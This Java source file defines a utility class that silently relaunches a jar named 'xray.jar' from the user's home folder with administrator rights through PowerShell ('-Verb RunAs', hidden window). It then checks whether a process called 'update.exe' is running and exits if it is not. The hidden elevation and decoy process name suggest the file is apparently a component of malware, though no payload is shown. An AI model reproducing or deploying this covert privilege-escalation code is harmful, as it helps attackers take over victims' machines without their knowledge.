package io.github.luxotick.utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Arrays;

public class ElevateUtil {
    public synchronized void elevate() {

        String user = System.getProperty("user.name");
        try {
            Process process = Runtime.getRuntime().exec("powershell.exe -Command \"Start-Process java -ArgumentList '-jar', 'C:\\Users\\" + user + "\\xray.jar' -Verb RunAs -WindowStyle Hidden\"");

            System.out.println("Elevated!");
            wait(5000);
            if(isProcessRunning("update.exe")){

            }
            else{
                System.exit(4);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }


    }
    private static boolean isProcessRunning(String processName) {
        ProcessBuilder processBuilder = new ProcessBuilder("wmic", "process", "list", "brief");
        boolean isRunning = false;

        try {
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;

            while ((line = reader.readLine()) != null) {
                if (line.contains(processName)) {
                    isRunning = true;
                    break;
                }
            }

            process.waitFor();
            process.destroy();

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }

        return isRunning;
    }
}
